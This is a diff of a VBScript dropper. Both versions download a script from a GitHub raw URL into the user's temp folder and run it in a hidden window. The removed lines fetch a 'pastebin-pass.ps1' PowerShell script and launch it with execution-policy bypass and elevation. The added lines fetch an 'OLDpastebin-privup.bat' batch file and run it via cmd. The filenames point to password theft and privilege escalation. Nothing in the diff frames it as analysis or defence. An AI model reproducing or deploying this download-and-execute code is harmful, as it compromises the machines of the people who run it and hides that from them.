@@ -1,8 +1,8 @@
 Dim i, objFile, objFSO, objHTTP, strFile
 Set WshShell = CreateObject("WScript.Shell")
 Home = WshShell.ExpandEnvironmentStrings("%tmp%")
-file = Home & "\pastebin-pass.ps1"
-myURL = "https://raw.githubusercontent.com/4V4loon/tools/master/pastebin/pastebin-pass.ps1"
+file = Home & "\priv.bat"
+myURL = "https://raw.githubusercontent.com/4V4loon/tools/master/pastebin/OLDpastebin-privup.bat"
 myPath = file
 Const ForReading = 1, ForWriting = 2, ForAppending = 8
 Set objFSO = CreateObject( "Scripting.FileSystemObject" )
@@ -20,6 +20,6 @@ For i = 1 To LenB( objHTTP.ResponseBody )
 Next
 objFile.Close()
 Set WshShell = CreateObject("WScript.Shell")
-cmd="powershell -command 'start-process PowerShell.exe -ArgumentList ""powershell -executionpolicy bypass -file "&file&""" -WindowStyle Hidden -Verb RunAs'"
+cmd="cmd /c "&file
 WshShell.Run cmd & file, 0, True
 Set WshShell = Nothing
